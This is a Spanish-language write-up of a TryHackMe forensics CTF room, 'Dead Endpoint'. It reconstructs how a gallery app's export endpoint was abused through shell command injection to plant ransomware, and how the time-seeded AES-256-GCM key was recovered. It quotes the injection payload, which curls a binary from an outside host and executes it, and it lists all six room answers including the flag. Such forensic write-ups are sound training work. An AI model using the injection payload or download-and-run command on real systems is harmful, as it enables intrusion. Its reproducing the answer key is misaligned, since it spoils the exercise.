# Dead Endpoint

## Estado

- **Tipo:** CTF / Team room.
- **URL:** [Dead Endpoint](https://tryhackme.com/room/deadendpoint).
- **Dificultad:** Hard.
- **Duración estimada:** 60 minutos.
- **Resultado técnico:** artefactos analizados y las seis respuestas recuperadas.
- **Actividad del evento:** #8 de 8; quinto CTF del evento.
- **Máquina:** terminada después del análisis.
- **AttackBox:** utilizado únicamente para montar la imagen de disco; se dejó
  fuera del flujo de trabajo después de terminar.

> No se conservaron credenciales, tokens, secretos de sesión ni la imagen de
> disco. Las respuestas se listan para documentar la resolución del room.

## Objetivo

Reconstruir el compromiso de un servidor Linux cuyo servicio de galería quedó
fuera de operación, identificar el endpoint vulnerable, analizar el ejecutable
dejado por el atacante y recuperar la imagen bloqueada que contiene el
checklist de inspección.

## Evidencia inicial

La imagen de disco contenía la aplicación en `/srv/gallery` y los siguientes
artefactos relevantes:

```text
/srv/gallery/app/gallery.py
/srv/gallery/data/gallery.sqlite3
/srv/gallery/media/originals/RESTORE.txt
/srv/gallery/media/originals/yard_0147.jpg.locked
/srv/gallery/media/originals/yard_0148.jpg.locked
/srv/gallery/media/originals/yard_0152.jpg.locked
/srv/gallery/.cache/.indexd
/var/log/nginx/gallery-access.log
```

El servicio estaba definido en `/etc/systemd/system/gallery.service` y
ejecutaba Gunicorn en `127.0.0.1:8080` con el usuario `gallery`.

## Reconstrucción del compromiso

### 1. Endpoint abusado

El código de exportación construía un comando con `shell=True` a partir del
campo `selection`:

```python
command = f"/bin/tar -cf '{destination}' -C '{ORIGINALS}' '{selection}'"
subprocess.run(command, shell=True, capture_output=True, text=True, timeout=45)
```

El registro de actividad de SQLite conserva el payload que descargó el
ejecutable y lo ejecutó contra el archivo generado:

```text
yard_0147.jpg; curl -fsS http://10.0.2.2:18081/assets/media-worker \
  -o /srv/gallery/.cache/.indexd && chmod 700 /srv/gallery/.cache/.indexd && \
  /srv/gallery/.cache/.indexd 27ee23c277fb4bc9.tar
```

El access log confirma tres solicitudes `POST` a:

```text
/api/albums/1/export
```

### 2. Ejecutable y hash

El binario descargado fue `/srv/gallery/.cache/.indexd`. Tras copiarlo para
analizarlo fuera de la imagen, sus características fueron:

```text
ELF 64-bit LSB pie x86-64, stripped
SHA-256: 6a0e5b25a919a94952b34e38d8e8b595036d1ef6a026bf5cca38a0d34459102f
```

Las cadenas y las llamadas de OpenSSL revelaron el uso de
`EVP_aes_256_gcm`, `EVP_EncryptInit_ex`, `EVP_EncryptUpdate` y
`EVP_EncryptFinal_ex`. El encabezado de los archivos bloqueados comienza con
`GPH1`, almacena el tamaño original, un nonce de 12 bytes y una etiqueta GCM
de 16 bytes.

### 3. Semilla y recuperación

El binario implementa un paso SplitMix64 y genera 32 bytes de clave a partir de
una semilla de tiempo en milisegundos (`clock_gettime`). La semilla se validó
contra la etiqueta GCM del archivo `yard_0152.jpg.locked` en la ventana del
ataque:

```text
1792474614662
```

La recuperación local siguió esta estructura:

```text
clave = cuatro salidas SplitMix64 empaquetadas little-endian
nonce = archivo[0x10:0x1c]
AAD   = archivo[:0x1c]
tag   = archivo[0x1c:0x2c]
datos = archivo[0x30:]
algoritmo = AES-256-GCM
```

El tercer archivo corresponde a la foto titulada `Quality and Safety
inspection record`. Al descifrarlo aparece un inspection checklist y, al pie,
la flag del room.

## Respuestas

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | Endpoint de aplicación abusado para ejecutar comandos | `/api/albums/1/export` |
| 2 | Ruta completa del ejecutable | `/srv/gallery/.cache/.indexd` |
| 3 | SHA-256 del ejecutable | `6a0e5b25a919a94952b34e38d8e8b595036d1ef6a026bf5cca38a0d34459102f` |
| 4 | Algoritmo/modo de cifrado | `AES-256-GCM` |
| 5 | Semilla inicial | `1792474614662` |
| 6 | Flag del checklist recuperado | `THM{R4ns0mw4r3_K3ys_Ar3_A_M4tt3r_Of_T1m3}` |

## Comprobaciones útiles

```bash
# Identificar el servicio y la aplicación
sed -n '1,220p' /mnt/dead/etc/systemd/system/gallery.service
rg -n 'export_job|shell=True|selection|subprocess' /mnt/dead/srv/gallery/app/gallery.py

# Correlacionar actividad, exportaciones y fotos
sudo sqlite3 -header -column /mnt/dead/srv/gallery/data/gallery.sqlite3 \
  'SELECT * FROM activity; SELECT * FROM exports; SELECT * FROM photos;'

# Revisar el acceso al endpoint vulnerable
sudo sed -n '1,120p' /mnt/dead/var/log/nginx/gallery-access.log

# Verificar el formato de los archivos bloqueados
sudo xxd -g1 -l48 /mnt/dead/srv/gallery/media/originals/yard_0152.jpg.locked
```

## Validación y cierre

Las seis respuestas quedaron preparadas para reportarse individualmente en
TryHackMe. El análisis forense, la semilla y la flag se verificaron localmente
contra el tag GCM y la imagen recuperada. La máquina de laboratorio se terminó
después de preservar los datos necesarios; no se publicaron los artefactos
privados del entorno.
